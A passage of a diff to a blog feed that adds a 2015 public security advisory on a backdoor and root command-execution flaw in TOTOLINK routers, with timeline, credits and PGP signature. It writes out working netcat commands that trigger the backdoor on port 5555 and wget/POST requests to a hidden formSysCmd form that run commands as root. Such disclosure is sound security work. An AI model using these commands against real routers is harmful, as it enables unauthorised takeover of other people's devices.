+This will open the HTTP remote management interface on port 80 in the eth1 interface which is the WAN interface by default.
+
+
+o By sending "oki,xasf" to the device, the device will execute: iptables -D INPUT -p tcp --dport 80 -i eth1 -j ACCEPT
+
+This will close the HTTP remote management interface.
+
+
+o By sending "bye,xasf" to the device, the device will do nothing
+
+
+The iptables commands in the backdoor are hardcoded with "eth1".
+Only devices using DHCP and static IP connections are affected because the WAN IP is attached on the eth1 device.
+
+It does not affect devices using PPPoE connections, because the WAN IP is attached on the ppp device, as seen below:
+
+totolink# ifconfig
+ppp0      Link encap:Point-to-Point Protocol
+inet addr:X.X.X.X  P-t-P:X.X.X.X  Mask:255.255.255.255
+UP POINTOPOINT RUNNING NOARP MULTICAST  MTU:1438  Metric:1
+RX packets:17308398 errors:0 dropped:0 overruns:0 frame:0
+TX packets:2605290 errors:0 dropped:0 overruns:0 carrier:0
+collisions:0 txqueuelen:64
+RX bytes:2803138455 (2.6 GiB)  TX bytes:277402492 (264.5 MiB)
+
+
+
+An attacker can use these simple netcat commands to test the backdoor:
+
+To open the HTTP remote management interface on the Internet:
+
+echo -ne "hel,xasf" | nc &lt;ip&gt; 5555
+
+To close the HTTP remote management interface on the Internet:
+
+echo -ne "oki,xasf" | nc &lt;ip&gt; 5555
+
+To detect a vulnerable router:
+
+echo -ne "GET / HTTP/1.1" | nc &lt;ip&gt; 5555
+
+if you see "GET / HTTP/1.1" in the answer, you likely detected a vulnerable router.
+
+
+## Details - RCE in the management interface
+
+A hidden form in the latest firmware allows an attacker to execute commands as root by sending a HTTP request:
+
+
+POST /boafrm/formSysCmd HTTP/1.1
+
+sysCmd=&lt;cmd&gt;&amp;apply=Apply&amp;msg=
+
+
+An attacker can use wget to execute commands in the remote device:
+
+wget --post-data='sysCmd=&lt;cmd&gt;&amp;apply=Apply&amp;msg=' http://ip//boafrm/formSysCmd
+
+
+For instance, sending this HTTP request to the management interface will reboot the device:
+
+
+POST /boafrm/formSysCmd HTTP/1.1
+
+sysCmd=reboot&amp;apply=Apply&amp;msg=
+
+This wget command will do the same job:
+
+wget --post-data='sysCmd=reboot&amp;apply=Apply&amp;msg=' http://ip//boafrm/formSysCmd
+
+
+
+## Vendor Response
+
+TOTOLINK was not contacted in regard of this case.
+
+
+
+## Report Timeline
+
+* Jun 25, 2015: Backdoor found by analysing TOTOLINK firmwares.
+* Jun 26, 2015: Working PoCs with RCE.
+* Jul 13, 2015: Updated firmwares confirmed vulnerable.
+* Jul 16, 2015: A public advisory is sent to security mailing lists.
+
+
+
+## Credit
+
+These vulnerabilities were found by Alexandre Torres and Pierre Kim (@PierreKimSec).
+
+
+
+## References
+
+https://pierrekim.github.io/advisories/2015-totolink-0x02.txt
+https://pierrekim.github.io/blog/2015-07-16-backdoor-and-RCE-found-in-8-TOTOLINK-products.html
+
+
+
+## Disclaimer
+
+This advisory is licensed under a Creative Commons Attribution Non-Commercial
+Share-Alike 3.0 License: http://creativecommons.org/licenses/by-nc-sa/3.0/
+
+
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1
+
+iQIcBAEBCgAGBQJVq/MLAAoJEMQ+Dtp9ky28bGEQAKcXghQtecYt4bSd+isQ7zh8
+8z6Q05F5fiReKaXSR2dFlBhulsq6o5TjIQsGB2mG/2GOthqn7KHNYwVMSGrdYNd6
+lmOD3yPnGl3c2SyuiabUEYk7FvoyZ2g71mxxyie4/dV7I3jir2DGToInjEp0IXgU
+hM6CeTFoTO5y9Z6VYHaaxI2POgqD9OojmL+1oE7h3bMiMoOftXeDh1IUSLpQddHa
+wBDHWhLXXJYNxv2vWubJaefv6gRomeaapLjODCMiMJX0Br4EZ9gzpzonOEGG+I8z
+gRwl+JO0CrxDhysiyMayU5uPsifomcWVXaEEZRdTMWDfWH0qB/f0/2zbFVMVzCVk
+17AedQyoPXWELhS7i9afZ2JCylcEHLgMhQeDQG48lQf4SCFxCyKD09pVnG13lsUC
+Ee2EQB5A7FkqcwAbq7xRnZuMd/Lpl/RuSKIby7VbqfcI1MDnKoKt9XQ9lLIulQvk
+WRnMgUxoyQ8fFzFn265qvb3a3RSWc+Yl8xRUky4IZ3jd+nbEqHdPWCKSG4D2C45J
+NHpyeY+aZ2p/hxCfJckJtzYdcZGXSVfO2FU0rr94K9XAeWXj3+RP3DOKGoTRLZCT
+7OxaHVHiB7aLXS2qta4EBYyjFVHJZOmlcyjYcKY/RhMGomWvoUegG3z7eAbjaoj0
+k2ILiaGzfv4z+aJ/iI05
+=z70S
+-----END PGP SIGNATURE-----
+</code></pre></content>
+    </entry>
+    
+    <entry>
         <title>127 ipTIME router models vulnerable to an unauthenticated RCE by sending a crafted DHCP request</title>
         <link href="2015-07-06-127-iptime-router-models-unauthenticated-RCE-with-DHCP.html"/>
         <content type="html"><pre><code>-----BEGIN PGP SIGNED MESSAGE-----
@@ -3402,7 +4554,7 @@ UH4RwA7mV/6Pm3ZOYG0I
     </entry>
     
     <entry>
-        <title>Exploit Code for ipTIME firmwares &#60; 9.58 RCE with root privileges against 127 router models</title>
+        <title>Exploit Code for ipTIME firmwares < 9.58 RCE with root privileges against 127 router models</title>
         <link href="2015-07-01-poc-with-RCE-against-127-iptime-router-models.html"/>
         <content type="html"><h2>Disclaimer</h2>
 <pre><code>This advisory is licensed under a Creative Commons Attribution Non-Commercial
